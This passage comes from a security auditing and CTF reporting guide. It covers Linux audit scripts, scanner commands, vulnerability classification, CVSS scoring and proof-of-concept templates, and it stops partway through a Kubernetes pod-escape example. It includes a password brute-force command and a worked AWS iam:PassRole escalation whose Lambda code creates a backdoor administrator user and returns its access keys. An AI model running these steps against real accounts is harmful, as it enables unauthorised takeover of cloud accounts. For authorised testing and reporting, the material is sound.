[ $? -eq 0 ] && echo "WARNING: World-readable log files found" || echo "PASS"

# Check systemd journal configuration
echo -e "\n[*] Systemd Journal Configuration"
journalctl --disk-usage 2>/dev/null
grep -h "SystemMaxUse\|SystemMaxFileSize" /etc/systemd/journald.conf 2>/dev/null | grep -v "^#"

echo -e "\n=== LOGGING AUDIT COMPLETE ==="
```

#### Network Security Violations

```bash
#!/bin/bash
# Network security configuration auditor

echo "=== NETWORK SECURITY AUDIT ==="

# Check firewall status
echo -e "\n[*] Firewall Status"
if command -v ufw &> /dev/null; then
    ufw status verbose
elif command -v firewall-cmd &> /dev/null; then
    firewall-cmd --state
    firewall-cmd --list-all
else
    iptables -L -n -v | head -20
fi

# Check for default ACCEPT policies
echo -e "\n[*] Default Firewall Policies"
iptables -L | grep "policy" | grep -i accept && echo "WARNING: Default ACCEPT policy detected" || echo "PASS"

# Check network interfaces
echo -e "\n[*] Network Interfaces"
ip addr show

# Check for promiscuous mode
echo -e "\n[*] Promiscuous Mode Check"
ip link | grep -i promisc && echo "WARNING: Interface in promiscuous mode" || echo "PASS"

# Check routing table
echo -e "\n[*] Routing Table"
ip route show

# Check for IPv6 if not needed
echo -e "\n[*] IPv6 Status"
[ -f /proc/net/if_inet6 ] && echo "IPv6 is enabled" || echo "IPv6 is disabled"
echo "Disable if not required: Add 'ipv6.disable=1' to kernel parameters"

# Check for open ports
echo -e "\n[*] Open Ports"
ss -tlnp | grep LISTEN | awk '{print $4, $7}' | sort -n

# Check for services accessible from external networks
echo -e "\n[*] Externally Accessible Services"
ss -tlnp | grep "0.0.0.0" | grep -v "127.0.0.1"

# Check ARP table for suspicious entries
echo -e "\n[*] ARP Table"
arp -n | head -10

# Check for suspicious connections
echo -e "\n[*] Established Connections"
ss -tnp | grep ESTAB | head -10

# Check DNS configuration
echo -e "\n[*] DNS Configuration"
cat /etc/resolv.conf | grep -v "^#"

# Check for DNS over TCP
echo -e "\n[*] Testing DNS Resolution"
dig +short google.com > /dev/null && echo "DNS resolution working" || echo "WARNING: DNS resolution failed"

echo -e "\n=== NETWORK SECURITY AUDIT COMPLETE ==="
```

#### File System and Encryption Violations

```bash
#!/bin/bash
# Filesystem security auditor

echo "=== FILESYSTEM SECURITY AUDIT ==="

# Check mount options for security
echo -e "\n[*] Mount Options"
mount | grep -E '\s/(tmp|var/tmp|home|dev/shm)\s'
echo "Recommended: nodev,nosuid,noexec for /tmp and /var/tmp"

# Check /tmp security
echo -e "\n[*] /tmp Security"
mount | grep '\s/tmp\s' | grep -q "noexec" && echo "PASS: noexec on /tmp" || echo "FAIL: /tmp allows execution"
mount | grep '\s/tmp\s' | grep -q "nosuid" && echo "PASS: nosuid on /tmp" || echo "FAIL: /tmp allows SUID"

# Check for unencrypted filesystems containing sensitive data
echo -e "\n[*] Encryption Status"
lsblk -o NAME,FSTYPE,MOUNTPOINT | grep -i crypt || echo "INFO: No encrypted filesystems detected"

# Check for world-writable directories
echo -e "\n[*] World-Writable Directories (excluding /tmp, /proc, /sys)"
find / -xdev -type d -perm -0002 ! -path "/tmp/*" ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" -ls 2>/dev/null | head -10

# Check for files in /tmp
echo -e "\n[*] Files in /tmp"
find /tmp -type f 2>/dev/null | wc -l
echo "files found (should be cleaned regularly)"

# Check sticky bit on world-writable directories
echo -e "\n[*] World-Writable Directories Without Sticky Bit"
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -10

# Check for large files (potential data exfiltration)
echo -e "\n[*] Large Files (>100MB)"
find / -xdev -type f -size +100M -ls 2>/dev/null | head -10

# Check for recently modified files
echo -e "\n[*] Recently Modified System Files (last 24 hours)"
find /etc /usr/bin /usr/sbin -type f -mtime -1 -ls 2>/dev/null | head -10

# Check core dumps
echo -e "\n[*] Core Dump Configuration"
cat /proc/sys/kernel/core_pattern
ulimit -c
echo "Recommended: Core dumps disabled (ulimit -c 0)"

# Check for sensitive files with weak permissions
echo -e "\n[*] Sensitive Files Permission Check"
SENSITIVE_FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" "/etc/ssh/sshd_config" "/root/.ssh/id_rsa")

for file in "${SENSITIVE_FILES[@]}"; do
    if [ -e "$file" ]; then
        ls -la "$file"
    fi
done

echo -e "\n=== FILESYSTEM SECURITY AUDIT COMPLETE ==="
```

## Automated Scanning Tools

### Comprehensive Scanning Frameworks

#### Nmap NSE Scripts for Configuration Auditing

```bash
# SSH configuration audit
nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos <target>

# HTTP security headers
nmap -p 80,443 --script http-security-headers <target>

# SSL/TLS configuration
nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-known-key <target>

# SMB configuration
nmap -p 445 --script smb-security-mode,smb-os-discovery,smb-enum-shares <target>

# DNS configuration
nmap -p 53 --script dns-zone-transfer,dns-recursion,dns-nsid <target>

# Full vulnerability and configuration scan
nmap -sV -sC --script vuln,auth,discovery <target>
```

#### Nikto Web Server Scanner

```bash
# Basic web server scan
nikto -h http://target

# Comprehensive scan with all plugins
nikto -h http://target -Plugins '@@ALL'

# Save results in multiple formats
nikto -h http://target -o nikto-report -Format htm,csv,xml

# Scan specific CGI directories
nikto -h http://target -Cgidirs '/cgi-bin /scripts /admin'

# Tune scan (1=Interesting File, 2=Misconfiguration, 3=Info Disclosure, 4=Injection, 5=RFI, 6=DOS, 7=RCE)
nikto -h http://target -Tuning 123

# Scan with authentication
nikto -h http://target -id username:password

# Check for specific vulnerabilities
nikto -h http://target -Plugins 'apache_expect_xss,clientaccesspolicy'
```

#### WPScan (WordPress Security Scanner)

```bash
# Basic WordPress scan
wpscan --url http://target

# Enumerate users
wpscan --url http://target --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://target --enumerate vp

# Enumerate vulnerable themes
wpscan --url http://target --enumerate vt

# Comprehensive enumeration
wpscan --url http://target --enumerate u,vp,vt,tt,cb,dbe

# Use API token for vulnerability data
wpscan --url http://target --api-token YOUR_TOKEN

# Aggressive detection
wpscan --url http://target --detection-mode aggressive

# Password brute force
wpscan --url http://target --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

#### testssl.sh (SSL/TLS Assessment)

```bash
# Basic SSL/TLS scan
testssl.sh https://target

# Fast scan (skip some tests)
testssl.sh --fast https://target

# Check specific vulnerability
testssl.sh --heartbleed --ccs-injection --ticketbleed https://target

# Check cipher suites
testssl.sh --cipher-per-proto https://target

# Check for PFS (Perfect Forward Secrecy)
testssl.sh --pfs https://target

# Full scan with JSON output
testssl.sh --jsonfile results.json https://target

# Check certificate
testssl.sh --cert-transparency https://target

# Parallel scanning
testssl.sh --parallel --file targets.txt
```

#### Scout Suite (Multi-Cloud Security Auditing)

[Inference: Scout Suite is an open-source cloud security auditing tool]

```bash
# Install Scout Suite
pip3 install scoutsuite

# AWS audit
scout --provider aws --profile default

# Azure audit
scout --provider azure --cli

# GCP audit
scout --provider gcp --project-id PROJECT_ID

# Specific services only
scout --provider aws --services s3,iam,ec2

# Generate HTML report
scout --provider aws --report-dir ./aws-audit-report
```

#### Lynis (Advanced Usage)

```bash
# Full system audit with custom profile
lynis audit system --profile /path/to/custom.prf

# Audit from cronjob
lynis audit system --cronjob --quiet

# Upload results to central server
lynis audit system --upload

# Audit Docker containers
lynis audit dockerfile Dockerfile

# Generate compliance report
lynis audit system --compliance

# Specific test categories only
lynis audit system --tests-from-group authentication,networking

# Skip certain tests
lynis audit system --skip-test AUTH-9204,FILE-6310

# Debug mode for troubleshooting
lynis audit system --debug --log-file lynis-debug.log
```

#### Custom Multi-Tool Scanner

```bash
#!/bin/bash
# Comprehensive automated security scanner
# Combines multiple tools for complete assessment

TARGET=$1
OUTPUT_DIR="scan_results_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting comprehensive security scan on $TARGET"
echo "[*] Results will be saved to $OUTPUT_DIR"

# 1. Nmap service detection
echo -e "\n[+] Running Nmap service detection..."
nmap -sV -sC -oA "$OUTPUT_DIR/nmap" $TARGET

# 2. Nikto web scan (if web service detected)
if nmap -p 80,443,8080,8443 $TARGET | grep -q "open"; then
    echo -e "\n[+] Running Nikto web server scan..."
    nikto -h http://$TARGET -o "$OUTPUT_DIR/nikto.html" -Format htm
fi

# 3. SSL/TLS scan (if HTTPS detected)
if nmap -p 443 $TARGET | grep -q "open"; then
    echo -e "\n[+] Running SSL/TLS security assessment..."
    testssl.sh --jsonfile "$OUTPUT_DIR/testssl.json" https://$TARGET
fi

# 4. SSH audit (if SSH detected)
if nmap -p 22 $TARGET | grep -q "open"; then
    echo -e "\n[+] Running SSH configuration audit..."
    nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos $TARGET -oN "$OUTPUT_DIR/ssh-audit.txt"
fi

# 5. DNS enumeration (if domain provided)
if [[ $TARGET =~ ^[a-zA-Z] ]]; then
    echo -e "\n[+] Running DNS enumeration..."
    dig +short $TARGET > "$OUTPUT_DIR/dns-lookup.txt"
    nslookup $TARGET >> "$OUTPUT_DIR/dns-lookup.txt"
fi

# 6. Directory brute force (web services)
if command -v gobuster &> /dev/null && nmap -p 80,443 $TARGET | grep -q "open"; then
    echo -e "\n[+] Running directory enumeration..."
    gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o "$OUTPUT_DIR/gobuster.txt" -q
fi

# 7. Vulnerability scan with Nmap NSE
echo -e "\n[+] Running vulnerability scan..."
nmap --script vuln $TARGET -oN "$OUTPUT_DIR/vulns.txt"

# 8. Generate summary report
echo -e "\n[+] Generating summary report..."
cat > "$OUTPUT_DIR/SUMMARY.txt" << EOF
Security Scan Summary for $TARGET
Generated: $(date)
===========================================

See individual files for detailed results:
- nmap.* : Service detection results
- nikto.html : Web server vulnerabilities
- testssl.json : SSL/TLS configuration
- ssh-audit.txt : SSH configuration
- vulns.txt : Known vulnerabilities

Review each file for detailed findings and remediation recommendations.
EOF

echo -e "\n[*] Scan complete. Results saved to $OUTPUT_DIR/"
echo "[*] Review $OUTPUT_DIR/SUMMARY.txt for overview"
```

### Tool Selection Matrix

[Inference: Tool selection depends on target type and assessment goals]

**Target Type → Recommended Tools:**

|Target|Primary Tools|Secondary Tools|
|---|---|---|
|Linux Server|Lynis, OpenSCAP|Custom scripts, Nmap NSE|
|Windows Server|PowerShell audit scripts|Nessus, OpenVAS|
|Web Application|Nikto, WPScan, testssl.sh|Nmap, Burp Suite|
|Network Device|Nmap, custom scripts|Nessus|
|Cloud (AWS/Azure/GCP)|Scout Suite, Prowler|Cloud-native tools (AWS Config, Azure Security Center)|
|Container/Docker|Docker Bench, Trivy|Lynis, custom scripts|
|Kubernetes|kube-bench, kube-hunter|Custom kubectl scripts|

---

## Key CTF Exploitation Patterns

**High-Value Configuration Misconfigurations:**

1. **SSH with password auth + weak passwords** → Brute force entry
2. **World-writable systemd service files** → Privilege escalation
3. **NOPASSWD sudo for dangerous binaries** → Root access
4. **Unencrypted database credentials in config files** → Data access
5. **Overly permissive CORS policies** → Cross-origin attacks
6. **Debug/verbose error messages enabled** → Information disclosure
7. **Default credentials not changed** → Instant access
8. **Unnecessary services with known vulnerabilities** → Remote exploitation

**Rapid CTF Configuration Audit Workflow:**

```bash
# 1. Quick service enumeration
nmap -sV -T4 $TARGET

# 2. Automated vulnerability detection
nmap --script vuln $TARGET

# 3. Web server quick checks
nikto -h http://$TARGET -Tuning 123

# 4. If SSH accessible, check config
sshd -T | grep -E '(PermitRootLogin|PasswordAuthentication|PermitEmptyPasswords)'

# 5. Check for common misconfigurations

curl -sI http://$TARGET | grep -i server curl -s http://$TARGET/robots.txt curl -s http://$TARGET/.git/config

# 6. If you have shell access, run rapid audit

find / -perm -4000 2>/dev/null # SUID binaries sudo -l # Sudo permissions cat /etc/crontab # Scheduled tasks
```

## Important Related Topics

- **Cloud-Specific Misconfiguration Scanning** (S3 buckets, IAM policies, Security Groups)
- **Active Directory Configuration Auditing** (Bloodhound, PingCastle, Group Policy analysis)
- **API Security Configuration Testing** (Broken authentication, excessive data exposure, rate limiting)
- **Mobile Application Configuration Review** (AndroidManifest.xml, Info.plist, certificate pinning)

---

# Reporting & Documentation

## Finding Classification

Finding classification is the systematic categorization of security vulnerabilities based on their type, impact, and exploitability to enable consistent tracking and remediation prioritization.

### Vulnerability Classification Taxonomies

**OWASP Classification:**

Primary categories for web/cloud applications:

- **Injection Flaws**: SQL injection, command injection, LDAP injection, XML injection, template injection
- **Broken Authentication**: Session fixation, weak password policies, missing MFA, credential stuffing vectors
- **Sensitive Data Exposure**: Unencrypted storage, weak cryptography, exposed configuration files, information disclosure
- **XML External Entities (XXE)**: XML parser exploitation, SSRF via XXE, file disclosure
- **Broken Access Control**: IDOR, path traversal, privilege escalation, missing function-level access control
- **Security Misconfiguration**: Default credentials, unnecessary services, verbose error messages, missing security headers
- **Cross-Site Scripting (XSS)**: Reflected XSS, stored XSS, DOM-based XSS
- **Insecure Deserialization**: Remote code execution via deserialization, object injection
- **Using Components with Known Vulnerabilities**: Outdated libraries, unpatched frameworks
- **Insufficient Logging & Monitoring**: Missing audit logs, delayed intrusion detection

**CWE (Common Weakness Enumeration) Mapping:**

```bash
# Common CWE classifications for CTF findings
CWE-22: Path Traversal
CWE-78: OS Command Injection
CWE-79: Cross-site Scripting
CWE-89: SQL Injection
CWE-94: Code Injection
CWE-287: Improper Authentication
CWE-352: Cross-Site Request Forgery
CWE-434: Unrestricted File Upload
CWE-502: Deserialization of Untrusted Data
CWE-798: Use of Hard-coded Credentials
```

**Cloud-Specific Classification:**

AWS/Azure/GCP vulnerability categories:

- **IAM Misconfiguration**: Overly permissive roles, missing MFA, unused credentials
- **Storage Exposure**: Public S3/Blob/GCS buckets, unauthenticated access, loose CORS policies
- **Network Segmentation Failures**: Overly permissive security groups, missing VPC isolation, open management ports
- **Secrets Management Issues**: Hard-coded credentials, plaintext API keys, exposed environment variables
- **Logging & Monitoring Gaps**: Disabled CloudTrail/Activity Logs, missing alerts, insufficient retention
- **Encryption Deficiencies**: Unencrypted storage, data in transit without TLS, weak key management
- **Resource Exposure**: Public IP assignments, internet-facing databases, exposed metadata services
- **Supply Chain Vulnerabilities**: Compromised container images, malicious Lambda layers, untrusted Terraform modules

**Infrastructure Classification:**

- **Container Security**: Privileged containers, exposed Docker sockets, vulnerable base images
- **Kubernetes Security**: RBAC bypasses, exposed API servers, pod escape vectors
- **CI/CD Pipeline Flaws**: Pipeline injection, insecure artifact storage, credential leakage in logs
- **Serverless Issues**: Function over-permissions, event injection, cold start exploitation

### Classification Process

**Step 1: Identify Attack Vector**

```
Network (N): Remotely exploitable
Adjacent (A): Local network access required
Local (L): Local system access required
Physical (P): Physical access required
```

**Step 2: Determine Vulnerability Type**

```bash
# Create standardized finding template
cat > finding_template.md <<EOF
## Finding Classification

**Title**: [Descriptive vulnerability name]
**Type**: [OWASP/CWE category]
**CWE-ID**: [Specific CWE number]
**Attack Vector**: [Network/Adjacent/Local/Physical]
**Asset**: [Affected system/application/service]
**Component**: [Specific component or function]

## Technical Classification

**Vulnerability Class**: [Injection/Authentication/Configuration/etc.]
**Exploitation Complexity**: [Low/Medium/High]
**Authentication Required**: [Yes/No]
**User Interaction**: [Required/Not Required]
**Scope**: [Unchanged/Changed]

## Impact Classification

**Confidentiality Impact**: [None/Low/High]
**Integrity Impact**: [None/Low/High]
**Availability Impact**: [None/Low/High]
**Business Impact**: [Critical/High/Medium/Low/Informational]
EOF
```

**Step 3: Tag with Metadata**

```bash
# Example finding tags for searchability
Tags: [RCE, AWS, IAM, Privilege-Escalation, Authentication-Bypass]
Platform: [Linux, Windows, Cloud, Web, Mobile]
Technology: [Python, Node.js, Docker, Kubernetes, Lambda]
Environment: [Production, Staging, Development]
```

### Classification Examples

**Example 1: Cloud IAM Privilege Escalation**

```
Title: AWS IAM Role Privilege Escalation via iam:PassRole
Type: Broken Access Control
CWE-ID: CWE-269 (Improper Privilege Management)
Attack Vector: Network
Asset: AWS Account ID 123456789012
Component: IAM Role "DeveloperRole"

Vulnerability Class: Privilege Escalation
Exploitation Complexity: Low
Authentication Required: Yes (AWS credentials required)
User Interaction: Not Required
Scope: Changed (escalate to different role context)

Confidentiality Impact: High (access to sensitive data)
Integrity Impact: High (modify infrastructure)
Availability Impact: High (delete resources)
Business Impact: Critical
```

**Example 2: Container Escape via Privileged Pod**

```
Title: Kubernetes Privileged Pod Escape to Host Root Access
Type: Security Misconfiguration
CWE-ID: CWE-250 (Execution with Unnecessary Privileges)
Attack Vector: Local
Asset: Kubernetes Cluster "prod-cluster-01"
Component: Pod "debug-pod" in namespace "default"

Vulnerability Class: Container Escape
Exploitation Complexity: Low
Authentication Required: Yes (pod exec permissions)
User Interaction: Not Required
Scope: Changed (escape container to host)

Confidentiality Impact: High (host filesystem access)
Integrity Impact: High (host system modification)
Availability Impact: High (cluster compromise)
Business Impact: Critical
```

## Severity Scoring (CVSS)

CVSS (Common Vulnerability Scoring System) provides standardized vulnerability severity ratings using a numerical score from 0.0 to 10.0.

### CVSS v3.1 Scoring Methodology

**Base Metrics:**

**Attack Vector (AV):**

```
Network (N) = 0.85: Remotely exploitable
Adjacent (A) = 0.62: Adjacent network access
Local (L) = 0.55: Local access required
Physical (P) = 0.2: Physical access required
```

**Attack Complexity (AC):**

```
Low (L) = 0.77: No special conditions
High (H) = 0.44: Special conditions required
```

**Privileges Required (PR):**

```
None (N) = 0.85: No authentication needed
Low (L) = 0.62 (unchanged) / 0.68 (changed): Basic user privileges
High (H) = 0.27 (unchanged) / 0.50 (changed): Admin/elevated privileges
```

**User Interaction (UI):**

```
None (N) = 0.85: No user interaction
Required (R) = 0.62: Requires user action
```

**Scope (S):**

```
Unchanged (U): Vulnerability confined to vulnerable component
Changed (C): Impacts resources beyond vulnerable component
```

**Confidentiality Impact (C):**

```
High (H) = 0.56: Total information disclosure
Low (L) = 0.22: Some information disclosure
None (N) = 0: No impact
```

**Integrity Impact (I):**

```
High (H) = 0.56: Total compromise of integrity
Low (L) = 0.22: Limited modification capability
None (N) = 0: No impact
```

**Availability Impact (A):**

```
High (H) = 0.56: Total availability loss
Low (L) = 0.22: Reduced availability
None (N) = 0: No impact
```

### CVSS Calculation Process

**Manual CVSS Scoring:**

```bash
# Use official CVSS calculator
# https://www.first.org/cvss/calculator/3.1

# Example: AWS IAM Privilege Escalation
AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

# Breakdown:
# AV:N - Network accessible (AWS API)
# AC:L - Low complexity (simple API calls)
# PR:L - Low privileges required (developer account)
# UI:N - No user interaction needed
# S:C - Scope changed (escalate to different role)
# C:H - High confidentiality impact (access all data)
# I:H - High integrity impact (modify infrastructure)
# A:H - High availability impact (delete resources)

# Base Score: 9.9 (Critical)
```

**Automated CVSS Calculation Script:**

```python
#!/usr/bin/env python3
# cvss_calculator.py

def calculate_impact_sub_score(c, i, a, scope):
    """Calculate Impact sub-score"""
    impact_values = {'N': 0, 'L': 0.22, 'H': 0.56}
    
    if scope == 'U':
        impact = 6.42 * (1 - ((1 - impact_values[c]) * 
                              (1 - impact_values[i]) * 
                              (1 - impact_values[a])))
    else:  # scope == 'C'
        impact = 7.52 * (1 - ((1 - impact_values[c]) * 
                              (1 - impact_values[i]) * 
                              (1 - impact_values[a]))) - 0.029 - \
                 3.25 * ((1 - ((1 - impact_values[c]) * 
                               (1 - impact_values[i]) * 
                               (1 - impact_values[a]))) ** 0.15)
    
    return impact if impact > 0 else 0

def calculate_exploitability_sub_score(av, ac, pr, ui, scope):
    """Calculate Exploitability sub-score"""
    av_values = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2}
    ac_values = {'L': 0.77, 'H': 0.44}
    ui_values = {'N': 0.85, 'R': 0.62}
    
    pr_values = {
        'U': {'N': 0.85, 'L': 0.62, 'H': 0.27},
        'C': {'N': 0.85, 'L': 0.68, 'H': 0.50}
    }
    
    exploitability = 8.22 * av_values[av] * ac_values[ac] * \
                     pr_values[scope][pr] * ui_values[ui]
    
    return exploitability

def calculate_base_score(av, ac, pr, ui, scope, c, i, a):
    """Calculate CVSS v3.1 Base Score"""
    impact = calculate_impact_sub_score(c, i, a, scope)
    
    if impact <= 0:
        return 0.0
    
    exploitability = calculate_exploitability_sub_score(av, ac, pr, ui, scope)
    
    if scope == 'U':
        base_score = min(10, (impact + exploitability))
    else:  # scope == 'C'
        base_score = min(10, 1.08 * (impact + exploitability))
    
    # Round up to one decimal
    return round(base_score * 10 + 0.00001) / 10

def get_severity_rating(score):
    """Convert numerical score to severity rating"""
    if score == 0.0:
        return "None"
    elif score < 4.0:
        return "Low"
    elif score < 7.0:
        return "Medium"
    elif score < 9.0:
        return "High"
    else:
        return "Critical"

# Example usage
if __name__ == "__main__":
    # AWS IAM Privilege Escalation
    score = calculate_base_score(
        av='N', ac='L', pr='L', ui='N', 
        scope='C', c='H', i='H', a='H'
    )
    
    print(f"Base Score: {score} ({get_severity_rating(score)})")
    print(f"Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H")
```

### Common CTF Vulnerability CVSS Examples

**SQL Injection (Unauthenticated):**

```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)

Rationale:
- Network accessible
- Low complexity exploitation
- No privileges required
- Can extract/modify all database data
```

**Stored XSS (Authenticated):**

```
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Score: 5.4 (Medium)

Rationale:
- Network accessible
- Low complexity
- Requires low privileges (user account)
- User interaction required (victim must view)
- Scope changed (affects other users)
- Limited confidentiality/integrity impact
```

**Kubernetes Privileged Container:**

```
Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
Score: 8.8 (High)

Rationale:
- Local access (inside container)
- Low complexity escape
- Low privileges (pod exec access)
- Scope changed (escape to host)
- Full host compromise possible
```

**AWS S3 Bucket Public Read:**

```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 7.5 (High)

Rationale:
- Network accessible
- No authentication required
- High confidentiality impact
- No integrity or availability impact
```

**SSRF to Metadata Service:**

```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Score: 10.0 (Critical)

Rationale:
- Network accessible (web application)
- Low complexity
- No privileges required
- Scope changed (access cloud credentials)
- Full account compromise possible
```

### CVSS Temporal and Environmental Metrics

[Inference] Temporal and Environmental metrics provide context-specific scoring adjustments, though they are optional and less commonly used in CTF reporting.

**Temporal Metrics** (adjust based on exploit availability):

```
Exploit Code Maturity (E): Not Defined (X) / High (H) / Functional (F) / Proof-of-Concept (P) / Unproven (U)
Remediation Level (RL): Not Defined (X) / Unavailable (U) / Workaround (W) / Temporary Fix (T) / Official Fix (O)
Report Confidence (RC): Not Defined (X) / Confirmed (C) / Reasonable (R) / Unknown (U)
```

**Environmental Metrics** (organization-specific adjustments):

```
Confidentiality Requirement (CR): Not Defined (X) / High (H) / Medium (M) / Low (L)
Integrity Requirement (IR): Not Defined (X) / High (H) / Medium (M) / Low (L)
Availability Requirement (AR): Not Defined (X) / High (H) / Medium (M) / Low (L)
```

### Severity Rating Guidelines

```bash
# Create severity matrix for reporting
cat > severity_matrix.md <<EOF
| CVSS Score | Severity | SLA | Priority | Description |
|------------|----------|-----|----------|-------------|
| 9.0 - 10.0 | Critical | 24h | P0 | Immediate exploitation, wide impact |
| 7.0 - 8.9  | High | 7d | P1 | Significant impact, likely exploitation |
| 4.0 - 6.9  | Medium | 30d | P2 | Moderate impact, authentication needed |
| 0.1 - 3.9  | Low | 90d | P3 | Limited impact, complex exploitation |
| 0.0 | None | N/A | P4 | Informational, no direct impact |
EOF
```

## Proof of Concept Creation

A proof of concept (PoC) demonstrates exploitability of a vulnerability in a controlled, reproducible manner without causing actual damage.

### PoC Design Principles

**Essential Components:**

1. **Environment Setup**: Exact configuration and prerequisites
2. **Step-by-Step Instructions**: Reproducible exploitation steps
3. **Expected Results**: What success looks like
4. **Evidence**: Screenshots, command output, logs
5. **Cleanup**: How to revert changes (if applicable)

### PoC Structure Template

```bash
# Create standardized PoC template
cat > poc_template.md <<EOF
# Proof of Concept: [Vulnerability Name]

## Executive Summary
Brief description of vulnerability and impact

## Environment
- **Target**: [IP/hostname/URL/cloud account]
- **Software Version**: [Specific versions]
- **Platform**: [OS, cloud provider, etc.]
- **Prerequisites**: [Required access, tools, credentials]

## Vulnerability Details
Technical explanation of the vulnerability

## Proof of Concept

### Step 1: [Initial Access/Setup]
\`\`\`bash
# Commands with explanations
command --option value
\`\`\`

**Expected Output:**
\`\`\`
[Expected command output]
\`\`\`

### Step 2: [Exploitation]
\`\`\`bash
# Exploitation commands
exploit_command
\`\`\`

**Evidence:**
[Screenshot/log output]

### Step 3: [Verification]
\`\`\`bash
# Verification commands
verify_command
\`\`\`

**Result:**
[Proof of successful exploitation]

## Impact Demonstration
Concrete examples of what attacker can achieve

## Cleanup
\`\`\`bash
# Commands to restore original state
cleanup_command
\`\`\`

## References
- [CVE/Advisory links]
- [Documentation references]
EOF
```

### PoC Examples by Vulnerability Type

**Example 1: AWS IAM Privilege Escalation PoC**

````bash
cat > poc_aws_privesc.md <<'EOF'
# Proof of Concept: AWS IAM Privilege Escalation via iam:PassRole

## Executive Summary
Low-privilege IAM user can escalate to Administrator access by passing a high-privilege role to Lambda function and executing code within that context.

## Environment
- **Target**: AWS Account 123456789012
- **IAM User**: developer-user (low privilege)
- **Vulnerable Role**: HighPrivilegeRole (Administrator access)
- **Prerequisites**: 
  - AWS CLI configured with developer-user credentials
  - Permissions: lambda:CreateFunction, lambda:InvokeFunction, iam:PassRole

## Vulnerability Details
The IAM user has iam:PassRole permission for HighPrivilegeRole without proper restrictions, allowing role passing to Lambda. The role's trust policy permits Lambda service assumption.

## Proof of Concept

### Step 1: Verify Current Permissions
```bash
# Check current identity
aws sts get-caller-identity

# Attempt admin action (should fail)
aws iam list-users
````

**Expected Output:**

```
An error occurred (AccessDenied) when calling the ListUsers operation
```

### Step 2: Create Malicious Lambda Function

```bash
# Create Python payload
cat > lambda_function.py <<'LAMBDA'
import boto3
import json

def lambda_handler(event, context):
    # Execute privileged operation
    iam = boto3.client('iam')
    users = iam.list_users()
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'message': 'Privilege escalation successful',
            'users': [u['UserName'] for u in users['Users']]
        })
    }
LAMBDA

# Zip payload
zip function.zip lambda_function.py

# Create function with high-privilege role
aws lambda create-function \
  --function-name privesc-poc \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/HighPrivilegeRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip
```

**Expected Output:**

```json
{
    "FunctionName": "privesc-poc",
    "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:privesc-poc",
    "Role": "arn:aws:iam::123456789012:role/HighPrivilegeRole",
    "State": "Active"
}
```

### Step 3: Execute Privileged Operation

```bash
# Invoke function
aws lambda invoke \
  --function-name privesc-poc \
  output.json

# View results
cat output.json
```

**Evidence:**

```json
{
    "statusCode": 200,
    "body": "{\"message\": \"Privilege escalation successful\", \"users\": [\"admin\", \"developer-user\", \"backup-user\"]}"
}
```

### Step 4: Demonstrate Full Compromise

```bash
# Update function to create new admin user
cat > lambda_function_v2.py <<'LAMBDA'
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    
    # Create backdoor admin user
    iam.create_user(UserName='backdoor-admin')
    iam.attach_user_policy(
        UserName='backdoor-admin',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    # Create access keys
    keys = iam.create_access_key(UserName='backdoor-admin')
    
    return {
        'AccessKeyId': keys['AccessKey']['AccessKeyId'],
        'SecretAccessKey': keys['AccessKey']['SecretAccessKey']
    }
LAMBDA

# Update function
zip function_v2.zip lambda_function_v2.py
aws lambda update-function-code \
  --function-name privesc-poc \
  --zip-file fileb://function_v2.zip

# Invoke to create admin user
aws lambda invoke --function-name privesc-poc admin_keys.json
cat admin_keys.json
```

## Impact Demonstration

- Created Lambda function with Administrator role
- Executed privileged IAM operations (list users)
- Created persistent backdoor admin user with full access
- Total account compromise achieved

## Cleanup

```bash
# Delete created resources
aws lambda delete-function --function-name privesc-poc
aws iam delete-access-key --user-name backdoor-admin --access-key-id <key-id>
aws iam detach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name backdoor-admin
rm function.zip function_v2.zip lambda_function.py lambda_function_v2.py output.json admin_keys.json
```

## References

- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- Rhino Security Labs: AWS IAM Privilege Escalation Methods EOF

````

**Example 2: Kubernetes Privileged Pod Escape PoC**

```bash
cat > poc_k8s_escape.md <<'EOF'
# Proof of Concept: Kubernetes Privileged Pod Escape to Host Root

## Executive Summary
Privileged pod configuration allows container escape to underlying host with root access, enabling full cluster compromise.

## Environment
- **Target**: Kubernetes cluster prod-cluster-01
- **Kubernetes Version**: v1.24.0
- **Vulnerable Pod**: debug-pod (namespace: default)
- **Prerequisites**:
  - kubectl access to cluster
  - Permission to create pods
  - Privileged security context enabled

## Vulnerability Details
Pod runs with privileged: true and hostPath volume mounts, allowing direct access to host filesystem and disabling security boundaries.

## Proof of Concept

### Step 1: Create Privileged Pod
```bash
cat > privileged-pod.yaml <<YAML
apiVersion: v1
kind: Pod
